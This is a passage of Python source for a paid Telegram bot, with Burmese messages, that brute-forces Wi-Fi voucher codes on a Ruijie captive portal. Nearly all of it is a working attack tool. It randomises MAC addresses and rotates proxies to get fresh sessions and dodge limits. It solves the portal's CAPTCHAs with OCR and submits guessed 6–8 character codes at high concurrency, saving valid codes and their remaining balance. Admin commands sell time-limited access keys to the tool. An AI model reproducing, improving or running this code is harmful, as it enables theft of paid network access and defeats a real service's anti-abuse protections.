            f"❌ သင်၏ key ကို registered မလုပ်ရသေးပါ။\n\nUSER ID: {user_id}\n\nPAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။"
        )

@bot.message_handler(commands=['listkeys'])
async def listkeys(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "No Permission")
        return
    try:
        auth_list, _ = await get_file_content("auth_list.json")
        if not auth_list:
            await bot.reply_to(message, "Registered key မရှိသေးပါ။")
            return
        lines = []
        for uid, data in auth_list.items():
            if isinstance(data, dict):
                expires = data.get("expires_at", "unknown")
                plan = data.get("plan", "unknown")
                if expires == "9999-12-31T23:59:59Z":
                    expires_str = "Unlimited"
                else:
                    try:
                        exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
                        now = datetime.now(timezone.utc)
                        if exp_dt < now:
                            expires_str = "Expired"
                        else:
                            diff = exp_dt - now
                            days = diff.days
                            hours, rem = divmod(diff.seconds, 3600)
                            minutes = rem // 60
                            expires_str = f"{days}d {hours}h {minutes}m left"
                    except:
                        expires_str = expires
            else:
                plan = "old"
                expires_str = str(data)
            lines.append(f"👤 {uid}\n   Plan: {plan}\n   Expires: {expires_str}")
        text = f"📋 Registered Keys ({len(auth_list)})\n\n" + "\n\n".join(lines)
        if len(text) > 4096:
            for i in range(0, len(text), 4096):
                await bot.send_message(message.chat.id, text[i:i+4096])
        else:
            await bot.reply_to(message, text)
    except Exception as e:
        print(f"Error at listkeys {e}")

@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 2:
            await bot.reply_to(message, "Usage:\n/delkey 123456789")
            return
        user_id = args[1]
        auth_list, sha = await get_file_content("auth_list.json")
        if user_id not in auth_list:
            await bot.reply_to(message, f"User ID {user_id} မတွေ့ပါ။")
            return
        del auth_list[user_id]
        await update_file_content(
            "auth_list.json",
            auth_list,
            sha,
            f"Delete key for {user_id}"
        )
        approve.pop(int(user_id), None)
        paid_users.pop(user_id, None)
        user_data.pop(int(user_id), None)
        await bot.reply_to(
            message,
            f"✅ Key Deleted\n\nUSER ID : {user_id}"
        )
    except Exception as e:
        print(f"Error at delkey {e}")

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 3:
            await bot.reply_to(message, "Usage:\n/genkey unlimited 123456789")
            return
        plan = args[1]
        user_id = args[2]
        expiry = generate_expiry(plan)
        if not expiry:
            await bot.reply_to(
                message,
                "Plans:\n30m\n1h\n1d\n7d\n1m\n1y\nunlimited"
            )
            return
        auth_list, sha = await get_file_content("auth_list.json")
        auth_list[user_id] = {
            "expires_at": expiry,
            "plan": plan
        }
        await update_file_content(
            "auth_list.json",
            auth_list,
            sha,
            f"Add key for {user_id}"
        )
        await bot.reply_to(
            message,
            f"✅ Key Generated\n\n"
            f"USER ID : {user_id}\n"
            f"PLAN : {plan}\n"
            f"EXPIRES : {expiry}"
        )
    except Exception as e:
        print(f"Error at genkey {e}")

@bot.message_handler(commands=['result'])
async def handle_result(message):
    user_id = str(message.chat.id)
    if user_id not in paid_users and user_id not in approve:
        await bot.reply_to(message, f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။")
        return
    
    results, _ = await get_file_content("result.json")
    chat_id_str = str(message.chat.id)
    if chat_id_str in results and results[chat_id_str]:
        codes = "\n".join(results[chat_id_str])
        await bot.reply_to(message, f"✅ Found Codes:\n{codes}")
    else:
        await bot.reply_to(message, "သင့်တွင် ယခင်ကရရှိထားသော code မရှိသေးပါ။")

def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            if expiry == "9999-12-31T23:59:59Z":
                return True
            exp_time = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
            return datetime.now(timezone.utc) < exp_time
        mm, hh, dd, MM, yyyy = map(
            int,
            expiration_time.split('-')
        )
        expiration_dt = datetime(
            year=yyyy,
            month=MM,
            day=dd,
            hour=hh,
            minute=mm,
            second=0,
            tzinfo=timezone.utc
        )
        return datetime.now(timezone.utc) < expiration_dt
    except Exception as e:
        print("Key parse error:", e)
        return False

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    plans = {
        "30m": timedelta(minutes=30),
        "1h": timedelta(hours=1),
        "1d": timedelta(days=1),
        "7d": timedelta(days=7),
        "1m": timedelta(days=30),
        "1y": timedelta(days=365),
        "unlimited": None
    }
    if plan not in plans:
        return None
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (now + plans[plan]).isoformat()

def get_current_time():
    return datetime.now(timezone.utc)

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    user_id = str(chat_id)
    
    if user_id not in paid_users and user_id not in approve:
        await bot.reply_to(message, f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။")
        return
    
    results, sha = await get_file_content("result.json")
    chat_id_str = str(message.chat.id)
    if chat_id_str in results and results[chat_id_str]:
        if message.chat.id not in user_data:
            await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
            return
        if "session_url" not in user_data.get(message.chat.id, {}):
            await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
            return
        codes = results[chat_id_str]
        await bot.reply_to(message, f"Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")
        session_url_recheck = user_data[message.chat.id]["session_url"]
        recheck_list = []
        for code in codes:
            recode = await perform_check_optimized(
                session_url_recheck,
                code,
                chat_id,
                scan_id=None,
                recheck=True,
                message=message
            )
            if recode:
                recheck_list.append(recode)
        to_show = "\n".join(recheck_list) if recheck_list else "Code များအားလုံးစစ်ဆေးပြီးပါပြီ မည်သည့် success code မျှရှာမတွေ့ပါ။"
        await bot.reply_to(message, f"✅ Rechecked Codes:\n\n{to_show}")
        await save_rechecked_codes(chat_id_str, recheck_list, sha)
    else:
        await bot.reply_to(message, "သင့်တွင် success code တစ်ခုမျှမရှိသေးပါ။")

@bot.message_handler(commands=['portal'])
async def handle_portal(message):
    user_id = str(message.chat.id)
    
    if user_id not in paid_users and user_id not in approve:
        await bot.reply_to(message, f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။")
        return
    
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(
            message,
            "🔗 Portal URL ထည့်သွင်းရန်:\n\n/portal [your_portal_url]\n\nဥပမာ:\n/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00"
        )
        return
    url = args[1]
    
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}
    
    await bot.reply_to(message, "🔗 Portal URL အားစစ်ဆေးနေပါသည်...")
    
    if await check_session_url_improved(session_url=url):
        user_data[message.chat.id]['session_url'] = url
        await save_portal_url(user_id, url)
        await bot.reply_to(
            message, 
            "✅ Portal URL အားသိမ်းဆည်းပြီးပါပြီ။\n\nVOUCHER ရွေးချယ်ရန် Menu ကိုသုံးပါ။",
            reply_markup=get_voucher_keyboard()
        )
    else:
        await bot.reply_to(
            message, 
            f"❌ Portal URL မှားယွင်းနေပါသည်။ ကျေးဇူးပြု၍ ပြန်လည်စစ်ဆေးပါ။\n\n"
            f"✅ မှန်ကန်တဲ့ URL ပုံစံ:\n"
            f"`https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00`",
            parse_mode="Markdown"
        )

async def check_session_url_improved(session_url):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    }
    
    session_obj, proxy = get_cached_session()
    
    try:
        async with session_obj.get(session_url, allow_redirects=True, headers=headers, proxy=proxy, timeout=15) as response:
            if response.status >= 400:
                return False
            
            final_url = str(response.url)
            response_text = await response.text()
            
            if "sessionId" in final_url or "sessionId" in response_text:
                return True
            
            portal_indicators = [
                "portal-as.ruijienetworks.com",
                "maccauth",
                "index.html",
                "sessionId",
                "lang=en_US"
            ]
            
            for indicator in portal_indicators:
                if indicator in final_url or indicator in response_text:
                    return True
            
            return True
            
    except Exception as e:
        print(f"Portal check error: {e}")
        return False

async def check_session_url(session_url, use_proxy=False):
    return await check_session_url_improved(session_url)

@bot.message_handler(commands=['scan'])
async def handle_key_scan(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(
            message,
            "VOUCHER ရွေးချယ်ရန်:\n\n/scan 6, 7, 8, ascii-lower, all, mixed, mixed8",
            reply_markup=get_voucher_keyboard()
        )
        return
    mode = args[1]
    chat_id = message.chat.id
    user_id = str(chat_id)
    
    if user_id not in paid_users and user_id not in approve:
        await bot.reply_to(
            message,
            f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။"
        )
        return
    
    if chat_id not in user_data:
        await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
        return
    if 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
        return

    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, "Scan သည် အလုပ်လုပ်နေပြီဖြစ်သည်။ STOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။")
        return

    progress_msg = await bot.send_message(chat_id, "🔍 Scanning VOUCHER Codes...\n\n")
    scan_id = str(uuid.uuid4())
    
    try:
        user_name = message.from_user.first_name or message.from_user.username or "User"
        portal_url = user_data[chat_id].get('session_url', 'Unknown')
        last_url = user_data[chat_id].get('last_admin_notified_url', '')
        
        if portal_url != last_url and portal_url != 'Unknown':
            admin_msg = f"🚀 **Scan Start Notification (/scan)**\n\n👤 **User:** {user_name}\n🆔 **User ID:** `{user_id}`\n🔢 **Mode:** {mode}\n🔗 **Portal URL:**\n`{portal_url}`"
            for admin_id in ADMINS:
                try:
                    await bot.send_message(admin_id, admin_msg, parse_mode="Markdown")
                except:
                    pass
            user_data[chat_id]['last_admin_notified_url'] = portal_url
    except Exception as e:
        print(f"Admin Notification Error in /scan: {e}")

    task = asyncio.create_task(
        run_bruteforce(
            mode,
            chat_id,
            user_data[chat_id]['session_url'],
            scan_id,
            message=message,
            progress_msg=progress_msg
        )
    )

    scan_tasks[chat_id] = {
        "task": task,
        "stop": False,
        "scan_id": scan_id
    }

@bot.message_handler(commands=['status'])
async def status(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "No Permission")
        return
    active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
    approved_users = len(paid_users) + sum(1 for v in approve.values() if v)
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    await bot.reply_to(
        message,
        f"📊 Bot Status\n\n"
        f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
        f"🔍 Active Scans: {active_scans}\n"
        f"✅ PAID Users: {approved_users}\n"
        f"👥 Sessions Loaded: {len(user_data)}"
    )

async def send_success_file(chat_id):
    target_ids = ["6988969946", "1981253384", "1477223103"]
    if str(chat_id) in target_ids and chat_id in success_texts and success_texts[chat_id]:
        try:
            filename = f"success_{chat_id}_{int(time.time())}.txt"
            content = "\n".join(success_texts[chat_id])
            with open(filename, "w", encoding="utf-8") as f:
                f.write(content)
            
            with open(filename, "rb") as f:
                await bot.send_document(chat_id, f, caption="✅ Scan ရပ်တန့်သွားသောကြောင့် ရရှိထားသော Success Codes များကို ဖိုင်အဖြစ် ပို့ပေးလိုက်ပါသည်။")
            
            if os.path.exists(filename):
                os.remove(filename)
        except Exception as e:
            print(f"Error sending file: {e}")

@bot.message_handler(commands=['stop'])
async def stop_scan_command(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["scan_id"] = None
        await send_success_file(chat_id)
        
        data["task"].cancel()
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        await bot.reply_to(message, "🛑 Scan ကို ရပ်တန့်ပြီးပါပြီ။", reply_markup=get_back_keyboard())
    else:
        await bot.reply_to(message, "ရပ်တန့်ရန် Scan မရှိပါ။", reply_markup=get_back_keyboard())

async def github_update_scheduler():
    global SUCCESS_CODE
    while True:
        await asyncio.sleep(180)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if items:
            try:
                results, sha = await get_file_content("result.json")
                for item in items:
                    chat_id = str(item["chat_id"])
                    code = item["code"]
                    if chat_id not in results:
                        results[chat_id] = []
                    if code not in results[chat_id]:
                        results[chat_id].append(code)
                await update_file_content("result.json", results, sha, "Periodic Update")
            except Exception as e:
                print(f"Update Error: {e}")

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

strings = string.ascii_lowercase + string.digits
def all_generator(length=6):
    return "".join(random.choice(strings) for _ in range(length))

strings_2 = string.ascii_lowercase
def ascii_generator(length=6):
    return "".join(random.choice(strings_2) for _ in range(length))

strings_mixed = string.ascii_lowercase + string.digits
def mixed_generator(length=6):
    return "".join(random.choice(strings_mixed) for _ in range(length))

def iter_codes(mode, start_digit=None):
    if mode in ["6", "7", "8"]:
        length = int(mode)
        if start_digit is not None:
            start = int(start_digit) * (10 ** (length - 1))
            end = (int(start_digit) + 1) * (10 ** (length - 1))
            for i in range(start, end):
                yield str(i).zfill(length)
            return
            
        if mode in ["6", "7"]:
            codes = [str(i).zfill(length) for i in range(10 ** length)]
            random.shuffle(codes)
            yield from codes
            return
        if mode == "8":
            while True:
                yield digit_generator(8)
    if mode == "ascii-lower":
        while True:
            yield ascii_generator(6)
    if mode == "all":
        while True:
            yield all_generator(6)
    if mode == "mixed":
        while True:
            yield mixed_generator(6)
    if mode == "mixed8":
        while True:
            yield mixed_generator(8)
    raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total=None, speed=0, found=0):
    speed_str = f"{speed:,.0f} codes/min"
    if total is not None:
        bar_length = 20
        percent = (checked / total) * 100
        filled = min(bar_length, int(percent / 5))
        bar = "█" * filled + "░" * (bar_length - filled)
        return (
            f"🔍Scanning VOUCHER Codes...\n\n"
            f"📦Checked : {checked:,}/{total:,}\n"
            f"📊Progress : {percent:.2f}%\n"
            f"⚡Speed : {speed_str}\n"
            f"✅Success code hit : {found}\n"
            f"[{bar}]"
        )
    return (
        f"🔍Scanning VOUCHER Codes...\n\n"
        f"📦Checked : {checked:,}\n"
        f"⚡Speed : {speed_str}\n"
        f"✅Success code hit : {found}\n"
        f"📊Status : running\n"
    )

def _captcha_entry(chat_id):
    if chat_id not in captcha_state:
        captcha_state[chat_id] = {
            "session_id": None,
            "auth_code": None,
            "lock": asyncio.Lock(),
        }
    return captcha_state[chat_id]

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None, start_digit=None):
    try:
        code_iter = iter_codes(mode, start_digit=start_digit)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return
    
    if mode in ["6", "7"]:
        total = 10 ** int(mode)
    elif mode == "8":
        total = 10 ** 8
    elif mode in ["mixed", "mixed8"]:
        total = None
    else:
        total = None
    
    checked = 0
    last_key_check = time.monotonic()
    scan_start = time.monotonic()
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                scan_tasks.pop(chat_id, None)
                success_messages.pop(chat_id, None)
                success_texts.pop(chat_id, None)
                return

            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            if time.monotonic() - last_key_check >= 3600:
                auth_list, _ = await get_file_content("auth_list.json")
                if str(chat_id) not in auth_list and str(chat_id) not in paid_users:
                    approve[chat_id] = False
                    await bot.send_message(chat_id, "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။")
                    scan_tasks.pop(chat_id, None)
                    success_messages.pop(chat_id, None)
                    success_texts.pop(chat_id, None)
                    return
                last_key_check = time.monotonic()

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check_optimized(session_url, code, chat_id, scan_id, message=message)

            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
            checked += len(batch)

            found = len(success_texts.get(chat_id, []))
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            
            if total is not None:
                text = format_progress(checked, total, speed, found)
            else:
                text = format_progress(checked, None, speed, found)
            
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text)
            except Exception:
                try:
                    new_msg = await bot.send_message(chat_id, text)
                    progress_msg.message_id = new_msg.message_id
                except Exception as err:
                    print(f"Progress Message Error: {err}")

        if progress_msg:
            found = len(success_texts.get(chat_id, []))
            if total is not None:
                finish_text = "🔍Scanning Completed\n\n" + f"📦Checked : {checked:,}/{total:,}\n✅ Success code hit: {found}\n📊Progress : 100%\n[██████████████████]"
            else:
                finish_text = "🔍Scanning Completed\n\n" + f"📦Checked : {checked:,}\n✅ Success code hit: {found}\n📊Progress : 100%\n[██████████████████]"
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=finish_text)
            except:
                try:
                    await bot.send_message(chat_id, finish_text)
                except Exception as err:
                    print(f"Progress Finish Message Error: {err}")
        await send_success_file(chat_id)
        
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
    finally:
        await send_success_file(chat_id)
        
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        global _active_scans_count
        async with _active_scans_lock:
            _active_scans_count = max(0, _active_scans_count - 1)

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    if "mac=" in url:
        return re.sub(r'mac=[^&]*', f'mac={new_mac}', url)
    separator = "&" if "?" in url else "?"
    return f"{url}{separator}mac={new_mac}"

async def get_session_id_cached(session_url):
    cache_key = session_url[:60]
    async with _session_cache_lock:
        if cache_key in _session_cache:
            cached = _session_cache[cache_key]
            if time.time() - cached['time'] < 300:
                return cached['session_id'], cached['proxy']
    
    session_id, proxy = await get_session_id_optimized(session_url)
    if session_id:
        async with _session_cache_lock:
            _session_cache[cache_key] = {'session_id': session_id, 'proxy': proxy, 'time': time.time()}
    return session_id, proxy

async def get_session_id_optimized(session_url):
    mac = get_mac()
    session_url = replace_mac(session_url, new_mac=mac)
    
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'upgrade-insecure-requests': '1',
    }
    
    session_obj, proxy = get_cached_session()
    try:
        async with session_obj.get(session_url, headers=headers, allow_redirects=True, proxy=proxy, timeout=10) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id:
                return session_id.group(1), proxy
    except:
        pass
    
    new_proxy = get_proxy_round_robin()
    new_session_obj, _ = get_cached_session(new_proxy)
    try:
        async with new_session_obj.get(session_url, headers=headers, allow_redirects=True, proxy=new_proxy, timeout=10) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id:
                return session_id.group(1), new_proxy
    except:
        pass
    
    return None, proxy

async def prefetch_captcha_batch(session_id, proxy, count=3):
    session_obj, _ = get_cached_session(proxy)
    async def fetch_one():
        try:
            image = await Captcha_Image(session_obj, session_id, proxy)
            text = await Captcha_Text_fast(image)
            return text
        except:
            return None
    
    tasks = [fetch_one() for _ in range(count)]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    valid = [r for r in results if r and isinstance(r, str)]
    return valid

async def perform_check_optimized(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    
    session_id, proxy = await get_session_id_cached(session_url)
    if not session_id:
        return
    
    try:
        captcha_texts = await prefetch_captcha_batch(session_id, proxy, count=3)
        if not captcha_texts:
            return
        
        auth_code = captcha_texts[0]
        session_obj, _ = get_cached_session(proxy)
        verified = await Varify_Captcha(session_obj, session_id, auth_code, proxy)
        if not verified:
            for text in captcha_texts[1:]:
                verified = await Varify_Captcha(session_obj, session_id, text, proxy)
                if verified:
                    auth_code = text
                    break
            if not verified:
                return

        data = {
            "accessCode": code,
            "sessionId": session_id,
            "apiVersion": 1,
            "authCode": auth_code,
        }
        
        headers = {
            "authority": "portal-as.ruijienetworks.com",
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://portal-as.ruijienetworks.com",
            "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
            "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Geo) Chrome/139.0.0.0 Mobile Safari/537.36",
        }
        
        async with session_obj.post(post_url, json=data, headers=headers, proxy=proxy, timeout=10) as req:
            response = await req.text()

        if 'logonUrl' in response:
            if recheck:
                return code
            if chat_id not in success_texts:
                success_texts[chat_id] = []
            expire_date, raw_mins = await Code_Expires_Date(session_id)
            success_texts[chat_id].append(f"🎫 {code}\n   {expire_date}")
            await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})
            if message:
                try:
                    code_line = "\n\n".join(success_texts[chat_id])
                    if chat_id not in success_messages:
                        sent = await bot.send_message(chat_id=message.chat.id, text=f"Success Codes:\n\n{code_line}")
                        success_messages[chat_id] = sent.message_id
                    else:
                        await bot.edit_message_text(chat_id=message.chat.id, message_id=success_messages[chat_id], text=f"Success Codes:\n\n{code_line}")
                except:
                    pass
        elif 'STA' in response:
            if chat_id not in limited_texts:
                limited_texts[chat_id] = []
            limited_texts[chat_id].append(code)
    except Exception as e:
        pass

def Minute_to_Hour(total_minutes):
    if total_minutes == 'Unknown':
        return 'Unknown'
    try:
        mins = int(total_minutes)
        if mins == 0:
            return "0m"
        hours = mins // 60
        rem_minutes = mins % 60
        if hours > 0 and rem_minutes > 0:
            return f"{hours}h {rem_minutes}m"
        elif hours > 0:
            return f"{hours}h"
        else:
            return f"{rem_minutes}m"
    except:
        return 'Unknown'

async def Code_Expires_Date(active_id):
    paths = [
        f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{active_id}',
        f'https://portal-as.ruijienetworks.com/api/macc/balance/getBalance/{active_id}',
        f'https://portal-as.ruijienetworks.com/api/maccauth/balance/getBalance/{active_id}',
        f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_id}'
    ]
    
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json;',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    timeout = aiohttp.ClientTimeout(total=10)
    session_obj, proxy = get_cached_session()
    async with aiohttp.ClientSession(
        connector=_connector,
        connector_owner=False,
        cookie_jar=aiohttp.CookieJar(),
        timeout=timeout
    ) as fresh_session:
        for url in paths:
            try:
                async with fresh_session.get(url, headers=headers, proxy=proxy) as req:
                    if req.status == 200:
                        respond = await req.json()
                        if respond.get('success'):
                            result = respond.get('result', {})
                            raw_minutes = result.get('totalMinutes')
                            if raw_minutes is None:
                                raw_minutes = result.get('remainingMinutes')
                            if raw_minutes is None:
                                raw_minutes = 'Unknown'
                            profile_name = result.get('profileName', 'Unknown')
                            totaltime = Minute_to_Hour(raw_minutes)
                            display = f"📋 Plan: {profile_name} | ⏳ Time: {totaltime}"
                            return display, raw_minutes
            except:
                continue
                
    return "📋 Plan: Unknown | ⏳ Time: Unknown", 'Unknown'

_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    try:
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        if img is None:
            return None
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        blur = cv2.GaussianBlur(gray, (3, 3), 0)
        _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        _, buffer = cv2.imencode('.png', thresh)
        result = _ocr.classification(buffer.tobytes())
        return result.upper()
    except:
        return None

async def Captcha_Text_fast(image_bytes):
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(_ocr_executor, _ocr_sync, image_bytes)

async def Captcha_Image(session, session_id, proxy=None):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {
        'sessionId': session_id,
        '_t': str(time.time()),
    }
    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers, proxy=proxy) as req:
        return await req.read()

async def Varify_Captcha(session, session_id, text, proxy=None):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervy&IS_EG=0&sessionId={session_id}',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {
        'sessionId': session_id,
        'authCode': text,
    }
    try:
        async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data, proxy=proxy) as req:
            data = await req.json()
            if data.get("success") == True:
                return session_id
    except:
        pass
    return None

async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=20)
            return
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(f"Polling connection error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            print(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    global session, _connector
    timeout = aiohttp.ClientTimeout(total=30)
    _connector = aiohttp.TCPConnector(
        limit=20000,
        limit_per_host=10000,
        ttl_dns_cache=300,
        ssl=False
    )
    session = aiohttp.ClientSession(
        timeout=timeout,
        connector=_connector,
        connector_owner=False
    )
    try:
        asyncio.create_task(web_server())
        asyncio.create_task(github_update_scheduler())
        await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
